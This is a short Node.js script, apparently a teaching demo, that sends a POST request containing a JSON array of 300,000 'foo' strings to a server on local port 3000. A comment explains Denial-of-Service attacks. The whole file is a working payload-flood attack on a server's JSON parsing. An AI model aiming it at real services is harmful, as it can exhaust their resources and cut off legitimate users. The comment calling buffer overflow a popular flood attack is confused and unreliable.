const http = require('http');

let req = http.request({
  method: 'POST',
  port: 3000,
  headers: {
    'Content-Type': 'application/json' //notifies server that you’re sending JSON data
  }
});

//begins sending a large array object
req.write('[');

//array contains 300,000 “foo” string entries
let n = 300000;
while (n--) {
 req.write('"foo",');
}

//end
req.write('"bar"]');
req.end();

/* A Denial-of-Service (DoS) attack is an attack meant to shut down a machine or network, making it inaccessible to its intended users.
   Popular flood attacks include: Buffer overflow attacks */